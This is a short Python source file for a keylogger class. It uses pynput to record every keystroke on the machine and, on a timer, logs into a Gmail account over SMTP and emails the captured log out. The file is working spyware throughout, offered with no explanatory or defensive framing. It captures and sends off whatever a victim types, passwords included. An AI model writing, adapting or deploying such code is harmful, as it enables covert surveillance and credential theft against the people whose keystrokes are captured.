#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:

    def __init__(self, email, password, time_interval):
        self.log = "Keylog Initiated"
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)



    def report(self):
        self.send_email(self.log)



    def send_email(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()
        with keyboard_listener:
            keyboard_listener.join()






